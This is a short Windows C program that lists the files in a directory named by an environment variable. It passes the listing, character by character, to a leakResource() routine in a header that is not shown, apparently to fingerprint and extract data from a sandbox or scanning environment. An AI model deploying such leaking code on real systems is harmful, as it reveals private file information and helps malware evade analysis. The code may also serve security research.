#include <windows.h>

void leakResource(int num);
void* readConfig(void);
void * memcpymyas(void* dst, const void* src, unsigned int cnt);
size_t mystrlen(const char * str);

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){
    int* data = (int*)readConfig(); // first int is the start index, second is the end index

    /* BEGIN FINGERPRINTING */ 
    char path[300] = {}; // f**k max path
    if(!GetEnvironmentVariable("<template>", path, 300)){
        return 0;
    }
    WIN32_FIND_DATA ffd;
    int length = mystrlen(path);
    memcpymyas(path+length, "\\*", 2);
    HANDLE hFind = FindFirstFile(path, &ffd);

    char* builtString = (char*)VirtualAlloc(0, 16000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

    memcpymyas(builtString, path, length+2);
    memcpymyas(builtString+length+2, "\n", 1);
    int index = length+3;
    do {
        if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
            int len = mystrlen(ffd.cFileName);
            memcpymyas(builtString+index, ffd.cFileName, len);
            memcpymyas(builtString+index+len, "\\\n", 2);  
            index += len+2;
        } else {
            int len = mystrlen(ffd.cFileName);
            memcpymyas(builtString+index, ffd.cFileName, len);
            memcpymyas(builtString+index+len, "\n", 1);
            index += len+1;
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    for(int i = data[0]; i < data[1]; i++){
        if(builtString[i] == '\0'){
            return 0;
        }
        leakResource(builtString[i]);
    }

    /* END FINGERPRINTING */

    ExitProcess(0);
    return 0;
}

// I can't seem to get mingw32-gcc to change the entrypoint of the binary (when compiling
// without the standard library. Hence, the entry point defaults to the first function
// so we must include at the bottom.
#include "leaker.h"